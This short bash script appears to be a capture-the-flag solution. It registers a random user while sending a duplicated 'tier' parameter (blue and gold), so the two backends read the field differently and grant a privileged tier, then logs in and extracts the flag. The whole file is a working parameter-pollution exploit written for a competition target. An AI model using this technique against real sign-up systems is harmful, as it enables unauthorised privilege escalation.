#!/bin/bash

USER=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13 ; echo '')

curl -s -X POST -d "username=$USER&password=boom&tier=blue&tier=gold" https://under-construction-web.2023.ctfcompetition.com/signup > /dev/null

curl -s -X POST -d "username=$USER&password=boom" https://under-construction-php-web.2023.ctfcompetition.com/ | grep -o "CTF{.*}"
